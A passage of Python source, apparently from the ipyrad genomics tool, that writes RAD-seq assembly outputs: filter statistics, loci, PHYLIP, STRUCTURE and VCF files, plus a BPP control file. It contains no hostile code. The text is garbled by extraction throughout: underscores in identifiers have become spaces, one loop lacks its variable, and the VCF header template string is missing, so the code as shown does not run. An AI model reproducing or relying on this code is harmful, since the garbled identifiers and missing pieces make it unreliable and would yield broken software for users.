, 2 ] . sum ( ) mask = afilt [ : , 0 : 3 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered by max shared het" ] += afilt [ ~ mask , 3 ] . sum ( ) mask = afilt [ : , 0 : 4 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered by min sample" ] += afilt [ ~ mask , 4 ] . sum ( ) mask = afilt [ : , 0 : 5 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered by max alleles" ] += afilt [ ~ mask , 5 ] . sum ( ) passed += np . sum ( afilt . sum ( axis = 1 ) == 0 ) ## get filter to count snps for only passed loci ## should we filter by all vars, or just by pis? doing all var now. apply filter = afilt . sum ( axis = 1 ) . astype ( np . bool ) ## get snps counts snplocs = asnps [ ~ apply filter , : ] . sum ( axis = 1 ) varlocs = snplocs . sum ( axis = 1 ) varcounts . update ( Counter ( varlocs ) ) #snpcounts.update(Counter(snplocs[:, 0])) piscounts . update ( Counter ( snplocs [ : , 1 ] ) ) ## increase counter to advance through h5 database start += optim ## record filtering of loci from total to final filtdat = pd . Series ( np . concatenate ( [ [ nloci ] , filters , [ passed ] ] ) , name = "total filters" , index = [ "total prefiltered loci" , "filtered by rm duplicates" , "filtered by max indels" , "filtered by max snps" , "filtered by max shared het" , "filtered by min sample" , "filtered by max alleles" , "total filtered loci" ] ) retained = pd . Series ( [ 0 ] * 8 , name = "retained loci" , index = [ "total prefiltered loci" , "filtered by rm duplicates" , "filtered by max indels" , "filtered by max snps" , "filtered by max shared het" , "filtered by min sample" , "filtered by max alleles" , "total filtered loci" ] ) retained [ "total prefiltered loci" ] = nloci retained [ "filtered by rm duplicates" ] = nloci - applied [ "filtered by rm duplicates" ] retained [ "filtered by max indels" ] = retained [ "filtered by rm duplicates" ] - applied [ "filtered by max indels" ] retained [ "filtered by max snps" ] = retained [ "filtered by max indels" ] - applied [ "filtered by max snps" ] retained [ "filtered by max shared het" ] = retained [ "filtered by max snps" ] - applied [ "filtered by max shared het" ] retained [ "filtered by min sample" ] = retained [ "filtered by max shared het" ] - applied [ "filtered by min sample" ] retained [ "filtered by max alleles" ] = retained [ "filtered by min sample" ] - applied [ "filtered by max alleles" ] retained [ "total filtered loci" ] = passed print ( u"\n\n## The number of loci caught by each filter." + u"\n## ipyrad API location: [assembly].stats dfs.s7 filters\n" , file = outstats ) data . stats dfs . s7 filters = pd . Data Frame ( [ filtdat , applied , retained ] ) . T data . stats dfs . s7 filters . to string ( buf = outstats ) ######################################################################## ## make dataframe of sample coverages ## samplecounts is len of anames from db. Save only samples in samples. #print(samplecounts) #samples = [i.name for i in samples] ## get sample names in the order of anames #sids = [list(anames).index(i) for i in samples] #covdict = {name: val for name, val in zip(np.array(samples)[sidx], samplecounts)} #covdict = {name: val for name, val in zip(samples, samplecounts[sidx])} covdict = pd . Series ( samplecounts , name = "sample coverage" , index = anames ) covdict = covdict [ covdict != 0 ] print ( u"\n\n\n## The number of loci recovered for each Sample." + u"\n## ipyrad API location: [assembly].stats dfs.s7 samples\n" , file = outstats ) data . stats dfs . s7 samples = pd . Data Frame ( covdict ) data . stats dfs . s7 samples . to string ( buf = outstats ) ######################################################################## ## get stats for locus coverage lrange = range ( 1 , len ( samples ) + 1 ) locdat = pd . Series ( locuscounts , name = "locus coverage" , index = lrange ) start = data . paramsdict [ "min samples locus" ] - 1 locsums = pd . Series ( { i : np . sum ( locdat . values [ start : i ] ) for i in lrange } , name = "sum coverage" , index = lrange ) print ( u"\n\n\n## The number of loci for which N taxa have data." + u"\n## ipyrad API location: [assembly].stats dfs.s7 loci\n" , file = outstats ) data . stats dfs . s7 loci = pd . concat ( [ locdat , locsums ] , axis = 1 ) data . stats dfs . s7 loci . to string ( buf = outstats ) ######################################################################### ## get stats for SNP distribution try : smax = max ( [ i + 1 for i in varcounts if varcounts [ i ] ] ) except Exception as inst : raise I Pyrad Warning Exit ( ) vardat = pd . Series ( varcounts , name = "var" , index = range ( smax ) ) . fillna ( 0 ) sumd = { } for i in range ( smax ) : sumd [ i ] = np . sum ( [ i * vardat . values [ i ] for i in range ( i + 1 ) ] ) varsums = pd . Series ( sumd , name = "sum var" , index = range ( smax ) ) pisdat = pd . Series ( piscounts , name = "pis" , index = range ( smax ) ) . fillna ( 0 ) sumd = { } for i in range ( smax ) : sumd [ i ] = np . sum ( [ i * pisdat . values [ i ] for i in range ( i + 1 ) ] ) pissums = pd . Series ( sumd , name = "sum pis" , index = range ( smax ) ) print ( u"\n\n\n## The distribution of SN Ps (var and pis) per locus." + u"\n## var = Number of loci with n variable sites (pis + autapomorphies)" + u"\n## pis = Number of loci with n parsimony informative site (minor allele in >1 sample)" + u"\n## ipyrad API location: [assembly].stats dfs.s7 snps\n" , file = outstats ) data . stats dfs . s7 snps = pd . concat ( [ vardat , varsums , pisdat , pissums ] , axis = 1 ) data . stats dfs . s7 snps . to string ( buf = outstats ) ########################################################################## ## print the stats summary (-r summary) with final sample loci data. fullstat = data . stats fullstat [ 'state' ] = 7 fullstat [ "loci in assembly" ] = data . stats dfs . s7 samples print ( u"\n\n\n## Final Sample stats summary\n" , file = outstats ) fullstat . to string ( buf = outstats ) ## close it outstats . close ( ) co5 . close ( )
def padnames ( names ) : ## get longest name longname len = max ( len ( i ) for i in names ) ## Padding distance between name and seq. padding = 5 ## add pad to names pnames = [ name + " " * ( longname len - len ( name ) + padding ) for name in names ] snppad = "//" + " " * ( longname len - 2 + padding ) return np . array ( pnames ) , snppad
def locichunk ( args ) : ## parse args data , optim , pnames , snppad , smask , start , samplecov , locuscov , upper = args ## this slice hslice = [ start , start + optim ] ## get filter db info co5 = h5py . File ( data . database , 'r' ) afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , ] aedge = co5 [ "edges" ] [ hslice [ 0 ] : hslice [ 1 ] , ] asnps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## get seqs db io5 = h5py . File ( data . clust database , 'r' ) if upper : aseqs = np . char . upper ( io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ) else : aseqs = io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## which loci passed all filters keep = np . where ( np . sum ( afilt , axis = 1 ) == 0 ) [ 0 ] store = [ ] ## write loci that passed after trimming edges, then write snp string for iloc in keep : edg = aedge [ iloc ] #LOGGER.info("!!!!!! iloc edg %s, %s", iloc, edg) args = [ iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ] if edg [ 4 ] : outstr , samplecov , locuscov = enter pairs ( * args ) store . append ( outstr ) else : outstr , samplecov , locuscov = enter singles ( * args ) store . append ( outstr ) ## write to file and clear store tmpo = os . path . join ( data . dirs . outfiles , data . name + ".loci.{}" . format ( start ) ) with open ( tmpo , 'w' ) as tmpout : tmpout . write ( "\n" . join ( store ) + "\n" ) ## close handles io5 . close ( ) co5 . close ( ) ## return sample counter return samplecov , locuscov , start
def enter pairs ( iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ) : ## snps was created using only the selected samples. LOGGER . info ( "edges in enter pairs %s" , edg ) seq1 = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] snp1 = asnps [ iloc , edg [ 0 ] : edg [ 1 ] + 1 , ] ## the 2nd read edges are +5 for the spacer seq2 = aseqs [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] snp2 = asnps [ iloc , edg [ 2 ] : edg [ 3 ] + 1 , ] ## remove rows with all Ns, seq has only selected samples nalln = np . all ( seq1 == "N" , axis = 1 ) ## make mask of removed rows and excluded samples. Use the inverse ## of this to save the coverage for samples nsidx = nalln + smask LOGGER . info ( "nsidx %s, nalln %s, smask %s" , nsidx , nalln , smask ) samplecov = samplecov + np . invert ( nsidx ) . astype ( np . int32 ) LOGGER . info ( "samplecov %s" , samplecov ) idx = np . sum ( np . invert ( nsidx ) . astype ( np . int32 ) ) LOGGER . info ( "idx %s" , idx ) locuscov [ idx ] += 1 ## select the remaining names in order seq1 = seq1 [ ~ nsidx , ] seq2 = seq2 [ ~ nsidx , ] names = pnames [ ~ nsidx ] ## save string for printing, excluding names not in samples outstr = "\n" . join ( [ name + s1 . tostring ( ) + "nnnn" + s2 . tostring ( ) for name , s1 , s2 in zip ( names , seq1 , seq2 ) ] ) #LOGGER.info("s1 %s", s1.tostring()) #LOGGER.info("s2 %s", s2.tostring()) ## get snp string and add to store snpstring1 = [ "-" if snp1 [ i , 0 ] else "*" if snp1 [ i , 1 ] else " " for i in range ( len ( snp1 ) ) ] snpstring2 = [ "-" if snp2 [ i , 0 ] else "*" if snp2 [ i , 1 ] else " " for i in range ( len ( snp2 ) ) ] #npis = str(snpstring1+snpstring2).count("*") #nvars = str(snpstring1+snpstring2).count("-") + npis outstr += "\n" + snppad + "" . join ( snpstring1 ) + "    " + "" . join ( snpstring2 ) + "|{}|" . format ( iloc + start ) #"|LOCID={},DBID={},NVAR={},NPIS={}|"\ #.format(1+iloc+start, iloc, nvars, npis) return outstr , samplecov , locuscov
def enter singles ( iloc , pnames , snppad , edg , aseqs , asnps , smask , samplecov , locuscov , start ) : ## grab all seqs between edges seq = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] ## snps was created using only the selected samples, and is edge masked. ## The mask is for counting snps quickly, but trimming is still needed here ## to make the snps line up with the seqs in the snp string. snp = asnps [ iloc , edg [ 0 ] : edg [ 1 ] + 1 , ] ## remove rows with all Ns, seq has only selected samples nalln = np . all ( seq == "N" , axis = 1 ) ## make mask of removed rows and excluded samples. Use the inverse ## of this to save the coverage for samples nsidx = nalln + smask samplecov = samplecov + np . invert ( nsidx ) . astype ( np . int32 ) idx = np . sum ( np . invert ( nsidx ) . astype ( np . int32 ) ) locuscov [ idx ] += 1 ## select the remaining names in order seq = seq [ ~ nsidx , ] names = pnames [ ~ nsidx ] ## save string for printing, excluding names not in samples outstr = "\n" . join ( [ name + s . tostring ( ) for name , s in zip ( names , seq ) ] ) ## get snp string and add to store snpstring = [ "-" if snp [ i , 0 ] else "*" if snp [ i , 1 ] else " " for i in range ( len ( snp ) ) ] outstr += "\n" + snppad + "" . join ( snpstring ) + "|{}|" . format ( iloc + start ) #LOGGER.info("outstr %s", outstr) return outstr , samplecov , locuscov
def snpcount numba ( superints , snpsarr ) : ## iterate over all loci for iloc in xrange ( superints . shape [ 0 ] ) : for site in xrange ( superints . shape [ 2 ] ) : ## make new array catg = np . zeros ( 4 , dtype = np . int16 ) ## a list for only catgs ncol = superints [ iloc , : , site ] for idx in range ( ncol . shape [ 0 ] ) : if ncol [ idx ] == 67 : #C catg [ 0 ] += 1 elif ncol [ idx ] == 65 : #A catg [ 1 ] += 1 elif ncol [ idx ] == 84 : #T catg [ 2 ] += 1 elif ncol [ idx ] == 71 : #G catg [ 3 ] += 1 elif ncol [ idx ] == 82 : #R catg [ 1 ] += 1 #A catg [ 3 ] += 1 #G elif ncol [ idx ] == 75 : #K catg [ 2 ] += 1 #T catg [ 3 ] += 1 #G elif ncol [ idx ] == 83 : #S catg [ 0 ] += 1 #C catg [ 3 ] += 1 #G elif ncol [ idx ] == 89 : #Y catg [ 0 ] += 1 #C catg [ 2 ] += 1 #T elif ncol [ idx ] == 87 : #W catg [ 1 ] += 1 #A catg [ 2 ] += 1 #T elif ncol [ idx ] == 77 : #M catg [ 0 ] += 1 #C catg [ 1 ] += 1 #A ## get second most common site catg . sort ( ) ## if invariant e.g., [0, 0, 0, 9], then nothing (" ") if not catg [ 2 ] : pass else : if catg [ 2 ] > 1 : snpsarr [ iloc , site , 1 ] = True else : snpsarr [ iloc , site , 0 ] = True return snpsarr
def write snps map ( data ) : ## grab map data from tmparr start = time . time ( ) tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : maparr = io5 [ "maparr" ] [ : ] ## get last data  end = np . where ( np . all ( maparr [ : ] == 0 , axis = 1 ) ) [ 0 ] if np . any ( end ) : end = end . min ( ) else : end = maparr . shape [ 0 ] ## write to map file (this is too slow...) outchunk = [ ] with open ( data . outfiles . snpsmap , 'w' ) as out : for idx in xrange ( end ) : ## build to list line = maparr [ idx , : ] #print(line) outchunk . append ( "{}\trad{} snp{}\t{}\t{}\n" . format ( line [ 0 ] , line [ 1 ] , line [ 2 ] , 0 , line [ 3 ] ) ) ## clear list if not idx % 10000 : out . write ( "" . join ( outchunk ) ) outchunk = [ ] ## write remaining out . write ( "" . join ( outchunk ) ) LOGGER . debug ( "finished writing snps map in: %s" , time . time ( ) - start )
def write usnps ( data , sidx , pnames ) : ## grab bis data from tmparr tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : bisarr = io5 [ "bisarr" ] ## trim to size b/c it was made longer than actual end = np . where ( np . all ( bisarr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( end ) : end = end . min ( ) else : end = bisarr . shape [ 1 ] ## write to usnps file with open ( data . outfiles . usnpsphy , 'w' ) as out : out . write ( "{} {}\n" . format ( bisarr . shape [ 0 ] , end ) ) for idx , name in enumerate ( pnames ) : out . write ( "{}{}\n" . format ( name , "" . join ( bisarr [ idx , : end ] ) ) )
def write str ( data , sidx , pnames ) : ## grab snp and bis data from tmparr start = time . time ( ) tmparrs = os . path . join ( data . dirs . outfiles , "tmp-{}.h5" . format ( data . name ) ) with h5py . File ( tmparrs , 'r' ) as io5 : snparr = io5 [ "snparr" ] bisarr = io5 [ "bisarr" ] ## trim to size b/c it was made longer than actual bend = np . where ( np . all ( bisarr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( bend ) : bend = bend . min ( ) else : bend = bisarr . shape [ 1 ] send = np . where ( np . all ( snparr [ : ] == "" , axis = 0 ) ) [ 0 ] if np . any ( send ) : send = send . min ( ) else : send = snparr . shape [ 1 ] ## write to str and ustr out1 = open ( data . outfiles . str , 'w' ) out2 = open ( data . outfiles . ustr , 'w' ) numdict = { 'A' : '0' , 'T' : '1' , 'G' : '2' , 'C' : '3' , 'N' : '-9' , '-' : '-9' } if data . paramsdict [ "max alleles consens" ] > 1 : for idx , name in enumerate ( pnames ) : out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in snparr [ idx , : send ] ] ) ) ) out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 1 ] ] for i in snparr [ idx , : send ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 1 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) else : ## haploid output for idx , name in enumerate ( pnames ) : out1 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in snparr [ idx , : send ] ] ) ) ) out2 . write ( "{}\t\t\t\t\t{}\n" . format ( name , "\t" . join ( [ numdict [ DUCT [ i ] [ 0 ] ] for i in bisarr [ idx , : bend ] ] ) ) ) out1 . close ( ) out2 . close ( ) LOGGER . debug ( "finished writing str in: %s" , time . time ( ) - start )
def concat vcf ( data , names , full ) : ## open handle and write headers if not full : writer = open ( data . outfiles . vcf , 'w' ) else : writer = gzip . open ( data . outfiles . VCF , 'w' ) vcfheader ( data , names , writer ) writer . close ( ) ## get vcf chunks vcfchunks = glob . glob ( data . outfiles . vcf + ".*" ) vcfchunks . sort ( key = lambda x : int ( x . rsplit ( "." ) [ - 1 ] ) ) ## concatenate if not full : writer = open ( data . outfiles . vcf , 'a' ) else : writer = gzip . open ( data . outfiles . VCF , 'a' ) ## what order do users want? The order in the original ref file? ## Sorted by the size of chroms? that is the order in faidx. ## If reference mapping then it's nice to sort the vcf data by ## CHROM and POS. This is doing a very naive sort right now, so the ## CHROM will be ordered, but not the pos within each chrom. if data . paramsdict [ "assembly method" ] in [ "reference" , "denovo+reference" ] : ## Some unix sorting magic to get POS sorted within CHROM ## First you sort by POS (-k 2,2), then you do a `stable` sort  ## by CHROM. You end up with POS ordered and grouped correctly by CHROM ## but relatively unordered CHRO Ms (locus105 will be before locus11). cmd = [ "cat" ] + vcfchunks + [ " | sort -k 2,2 -n | sort -k 1,1 -s" ] cmd = " " . join ( cmd ) proc = sps . Popen ( cmd , shell = True , stderr = sps . STDOUT , stdout = writer , close fds = True ) else : proc = sps . Popen ( [ "cat" ] + vcfchunks , stderr = sps . STDOUT , stdout = writer , close fds = True ) err = proc . communicate ( ) [ 0 ] if proc . returncode : raise I Pyrad Warning Exit ( "err in concat vcf: %s" , err ) writer . close ( ) for chunk in vcfchunks : os . remove ( chunk )
def vcfchunk ( data , optim , sidx , chunk , full ) : ## empty array to be filled before writing ## will not actually be optim*maxlen, extra needs to be trimmed maxlen = data . hackersonly [ "max fragment length" ] + 20 ## get data sliced (optim chunks at a time) hslice = [ chunk , chunk + optim ] ## read all taxa from disk (faster), then subsample taxa with sidx and ## keepmask to greatly reduce the memory load with h5py . File ( data . database , 'r' ) as co5 : afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] keepmask = afilt . sum ( axis = 1 ) == 0 ## apply mask to edges aedge = co5 [ "edges" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] aedge = aedge [ keepmask , : ] del afilt ## same memory subsampling. with h5py . File ( data . clust database , 'r' ) as io5 : ## apply mask to edges to aseqs and acatg #aseqs = io5["seqs"][hslice[0]:hslice[1], :, :].view(np.uint8) ## need to read in seqs with upper b/c lowercase allele info aseqs = np . char . upper ( io5 [ "seqs" ] [ hslice [ 0 ] : hslice [ 1 ] , : , : ] ) . view ( np . uint8 ) aseqs = aseqs [ keepmask , : ] aseqs = aseqs [ : , sidx , : ] acatg = io5 [ "catgs" ] [ hslice [ 0 ] : hslice [ 1 ] , : , : , : ] acatg = acatg [ keepmask , : ] acatg = acatg [ : , sidx , : , : ] achrom = io5 [ "chroms" ] [ hslice [ 0 ] : hslice [ 1 ] ] achrom = achrom [ keepmask , : ] LOGGER . info ( 'acatg.shape %s' , acatg . shape ) ## to save memory some columns are stored in diff dtypes until printing if not full : with h5py . File ( data . database , 'r' ) as co5 : snps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , : ] snps = snps [ keepmask , : ] snps = snps . sum ( axis = 2 ) snpidxs = snps > 0 maxsnplen = snps . sum ( ) ## vcf info to fill, this is bigger than the actual array nrows = maxsnplen cols0 = np . zeros ( nrows , dtype = np . int64 ) #h5py.special dtype(vlen=bytes)) cols1 = np . zeros ( nrows , dtype = np . uint32 ) cols34 = np . zeros ( ( nrows , 2 ) , dtype = "S5" ) cols7 = np . zeros ( ( nrows , 1 ) , dtype = "S20" ) ## when nsamples is high this blows up memory (e.g., dim=(5M x 500)) ## so we'll instead create a list of arrays with 10 samples at a time. ## maybe later replace this with a h5 array tmph = os . path . join ( data . dirs . outfiles , ".tmp.{}.h5" . format ( hslice [ 0 ] ) ) htmp = h5py . File ( tmph , 'w' ) htmp . create dataset ( "vcf" , shape = ( nrows , sum ( sidx ) ) , dtype = "S24" ) ## which loci passed all filters init = 0 ## write loci that passed after trimming edges, then write snp string locindex = np . where ( keepmask ) [ 0 ] for iloc in xrange ( aseqs . shape [ 0 ] ) : edg = aedge [ iloc ] ## grab all seqs between edges if not 'pair' in data . paramsdict [ "datatype" ] : seq = aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] catg = acatg [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] if not full : snpidx = snpidxs [ iloc , edg [ 0 ] : edg [ 1 ] + 1 ] seq = seq [ : , snpidx ] catg = catg [ : , snpidx ] else : seq = np . hstack ( [ aseqs [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] , aseqs [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) catg = np . hstack ( [ acatg [ iloc , : , edg [ 0 ] : edg [ 1 ] + 1 ] , acatg [ iloc , : , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) if not full : snpidx = np . hstack ( [ snpidxs [ iloc , edg [ 0 ] : edg [ 1 ] + 1 ] , snpidxs [ iloc , edg [ 2 ] : edg [ 3 ] + 1 ] ] ) seq = seq [ : , snpidx ] catg = catg [ : , snpidx ] ## empty arrs to fill alleles = np . zeros ( ( nrows , 4 ) , dtype = np . uint8 ) genos = np . zeros ( ( seq . shape [ 1 ] , sum ( sidx ) ) , dtype = "S4" ) genos [ : ] = "./.:" ## ----  build string array ---- pos = 0 ## If any < 0 this indicates an anonymous locus in denovo+ref assembly if achrom [ iloc ] [ 0 ] > 0 : pos = achrom [ iloc ] [ 1 ] cols0 [ init : init + seq . shape [ 1 ] ] = achrom [ iloc ] [ 0 ] cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . where ( snpidx ) [ 0 ] + 1 else : if full : cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . arange ( seq . shape [ 1 ] ) + 1 else : cols1 [ init : init + seq . shape [ 1 ] ] = pos + np . where ( snpidx ) [ 0 ] + 1 cols0 [ init : init + seq . shape [ 1 ] ] = ( chunk + locindex [ iloc ] + 1 ) * - 1 ## fill reference base alleles = reftrick ( seq , GETCONS ) ## get the info string column tmp0 = np . sum ( catg , axis = 2 ) tmp1 = tmp0 != 0 tmp2 = tmp1 . sum ( axis = 1 ) > 0 nsamp = np . sum ( tmp1 , axis = 0 ) depth = np . sum ( tmp0 , axis = 0 ) list7 = [ [ "NS={};DP={}" . format ( i , j ) ] for i , j in zip ( nsamp , depth ) ] if list7 : cols7 [ init : init + seq . shape [ 1 ] ] = list7 ## default fill cons sites where no variants genos [ tmp1 . T ] = "0/0:" ## fill cons genotypes for sites with alt alleles for taxa in order mask = alleles [ : , 1 ] == 46 mask += alleles [ : , 1 ] == 45 obs = alleles [ ~ mask , : ] alts = seq [ : , ~ mask ] who = np . where ( mask == False ) [ 0 ] ## fill variable sites for site in xrange ( alts . shape [ 1 ] ) : bases = alts [ : , site ] #LOGGER.info("bases %s", bases) ohere = obs [ site ] [ obs [ site ] != 0 ] #LOGGER.info("ohere %s", ohere) alls = np . array ( [ DCONS [ i ] for i in bases ] , dtype = np . uint32 ) #LOGGER.info("all %s", alls) for jdx in xrange ( ohere . shape [ 0 ] ) : alls [ alls == ohere [ jdx ] ] = jdx #LOGGER.info("all2 %s", alls) ## fill into array for cidx in xrange ( catg . shape [ 0 ] ) : if tmp2 [ cidx ] : if alls [ cidx ] [ 0 ] < 5 : genos [ who [ site ] , cidx ] = "/" . join ( alls [ cidx ] . astype ( "S1" ) . tolist ( ) ) + ":" else : genos [ who [ site ] , cidx ] = "./.:" #LOGGER.info("genos filled: %s %s %s", who[site], cidx, genos) ## build geno+depth strings ## for each taxon enter 4 catg values fulltmp = np . zeros ( ( seq . shape [ 1 ] , catg . shape [ 0 ] ) , dtype = "S24" ) for cidx in xrange ( catg . shape [ 0 ] ) : ## fill catgs from catgs tmp0 = [ str ( i . sum ( ) ) for i in catg [ cidx ] ] tmp1 = [ "," . join ( i ) for i in catg [ cidx ] . astype ( "S4" ) . tolist ( ) ] tmp2 = [ "" . join ( i + j + ":" + k ) for i , j , k in zip ( genos [ : , cidx ] , tmp0 , tmp1 ) ] ## fill tmp allcidx fulltmp [ : , cidx ] = tmp2 ## write to h5 for this locus htmp [ "vcf" ] [ init : init + seq . shape [ 1 ] , : ] = fulltmp cols34 [ init : init + seq . shape [ 1 ] , 0 ] = alleles [ : , 0 ] . view ( "S1" ) cols34 [ init : init + seq . shape [ 1 ] , 1 ] = [ "," . join ( [ j for j in i if j ] ) for i in alleles [ : , 1 : ] . view ( "S1" ) . tolist ( ) ] ## advance counter init += seq . shape [ 1 ] ## trim off empty rows if they exist withdat = cols0 != 0 tot = withdat . sum ( ) ## get scaffold names faidict = { } if ( data . paramsdict [ "assembly method" ] in [ "reference" , "denovo+reference" ] ) and ( os . path . exists ( data . paramsdict [ "reference sequence" ] ) ) : fai = pd . read csv ( data . paramsdict [ "reference sequence" ] + ".fai" , names = [ 'scaffold' , 'size' , 'sumsize' , 'a' , 'b' ] , sep = "\t" ) faidict = { i + 1 : j for i , j in enumerate ( fai . scaffold ) } try : ## This is hax, but it's the only way it will work. The faidict uses positive numbers ## for reference sequence mapped loci for the CHROM/POS info, and it uses negative ## numbers for anonymous loci. Both are 1 indexed, which is where that last `+ 2` comes from. faidict . update ( { - i : "locus {}" . format ( i - 1 ) for i in xrange ( chunk + 1 , chunk + optim + 2 ) } ) chroms = [ faidict [ i ] for i in cols0 ] except Exception as inst : LOGGER . error ( "Invalid chromosome dictionary indexwat: {}" . format ( inst ) ) LOGGER . debug ( "faidict {}" . format ( [ str ( k ) + "/" + str ( v ) for k , v in faidict . items ( ) if "locus" in v ] ) ) LOGGER . debug ( "chroms {}" . format ( [ x for x in cols0 if x < 0 ] ) ) raise cols0 = np . array ( chroms ) #else: #    cols0 = np.array(["locus {}".format(i) for i in cols0-1]) ## Only write if there is some data that passed filtering if tot : LOGGER . debug ( "Writing data to vcf" ) if not full : writer = open ( data . outfiles . vcf + ".{}" . format ( chunk ) , 'w' ) else : writer = gzip . open ( data . outfiles . vcf + ".{}" . format ( chunk ) , 'w' ) try : ## write in iterations b/c it can be freakin huge. ## for cols0 and cols1 the 'newaxis' slice and the transpose ## are for turning the 1d arrays into column vectors. np . savetxt ( writer , np . concatenate ( ( cols0 [ : tot ] [ np . newaxis ] . T , cols1 [ : tot ] [ np . newaxis ] . T , np . array ( [ [ "." ] ] * tot , dtype = "S1" ) , cols34 [ : tot , : ] , np . array ( [ [ "13" , "PASS" ] ] * tot , dtype = "S4" ) , cols7 [ : tot , : ] , np . array ( [ [ "GT:DP:CATG" ] ] * tot , dtype = "S10" ) , htmp [ "vcf" ] [ : tot , : ] , ) , axis = 1 ) , delimiter = "\t" , fmt = "%s" ) except Exception as inst : LOGGER . error ( "Error building vcf file - " . format ( inst ) ) raise writer . close ( ) ## close and remove tmp h5 htmp . close ( ) os . remove ( tmph )
def reftrick ( iseq , consdict ) : altrefs = np . zeros ( ( iseq . shape [ 1 ] , 4 ) , dtype = np . uint8 ) altrefs [ : , 1 ] = 46 for col in xrange ( iseq . shape [ 1 ] ) : ## expand colums with ambigs and remove N- fcounts = np . zeros ( 111 , dtype = np . int64 ) counts = np . bincount ( iseq [ : , col ] ) #, minlength=90) fcounts [ : counts . shape [ 0 ] ] = counts ## set N and - to zero, wish numba supported minlen arg fcounts [ 78 ] = 0 fcounts [ 45 ] = 0 ## add ambig counts to true bases for aidx in xrange ( consdict . shape [ 0 ] ) : nbases = fcounts [ consdict [ aidx , 0 ] ] for in xrange ( nbases ) : fcounts [ consdict [ aidx , 1 ] ] += 1 fcounts [ consdict [ aidx , 2 ] ] += 1 fcounts [ consdict [ aidx , 0 ] ] = 0 ## now get counts from the modified counts arr who = np . argmax ( fcounts ) altrefs [ col , 0 ] = who fcounts [ who ] = 0 ## if an alt allele fill over the "." placeholder who = np . argmax ( fcounts ) if who : altrefs [ col , 1 ] = who fcounts [ who ] = 0 ## if 3rd or 4th alleles observed then add to arr who = np . argmax ( fcounts ) altrefs [ col , 2 ] = who fcounts [ who ] = 0 ## if 3rd or 4th alleles observed then add to arr who = np . argmax ( fcounts ) altrefs [ col , 3 ] = who return altrefs
def vcfheader ( data , names , ofile ) : ## choose reference string if data . paramsdict [ "reference sequence" ] : reference = data . paramsdict [ "reference sequence" ] else : reference = "pseudo-reference (most common base at site)" ##FILTER=<ID=min Cov,Description="Data shared across <{mincov} samples"> ##FILTER=<ID=max SH,Description="Heterozygosous site shared across >{maxsh} samples"> header = . format ( date = time . strftime ( "%Y/%m/%d" ) , version = version , reference = os . path . basename ( reference ) , mincov = data . paramsdict [ "min samples locus" ] , maxsh = data . paramsdict [ "max shared Hs locus" ] , names = "\t" . join ( names ) ) ## WRITE ofile . write ( header )
def write ctl ( name , imap , guidetree , nloci , infer sptree , infer delimit , delimit alg , seed , burnin , nsample , sampfreq , thetaprior , tauprior , traits df , nu0 , kappa0 , cleandata , useseqdata , usetraitdata , wdir , finetune , verbose ) : ## A string to store ctl info ctl = [ ] ## check the tree (can do this better once we install ete3 w/ ipyrad) if not guidetree . endswith ( ";" ) : guidetree += ";" ## if traits df then we make '.ibpp' files prog = 'bpp' if isinstance ( traits df , pd . Data Frame ) : prog = 'ibpp' ## write the top header info ctl . append ( "seed = {}" . format ( seed ) ) ctl . append ( "seqfile = {}.{}.seq.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "Imapfile = {}.{}.imap.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "mcmcfile = {}.{}.mcmc.txt" . format ( OPJ ( wdir , name ) , prog ) ) ctl . append ( "outfile = {}.{}.out.txt" . format ( OPJ ( wdir , name ) , prog ) ) if isinstance ( traits df , pd . Data Frame ) : ctl . append ( "traitfile = {}.{}.traits.txt" . format ( OPJ ( wdir , name ) , prog ) ) ## number of loci (checks that seq file exists and parses from there) ctl . append ( "nloci = {}" . format ( nloci ) ) ctl . append ( "usedata = {}" . format ( useseqdata ) ) ctl . append ( "cleandata = {}" . format ( cleandata ) ) ## infer species tree if infer sptree : ctl . append ( "speciestree = 1 0.4 0.2 0.1" ) else : ctl . append ( "speciestree = 0" ) ## infer delimitation (with algorithm 1 by default) ctl . append ( "speciesdelimitation = {} {} {}" . format ( infer delimit , delimit alg [ 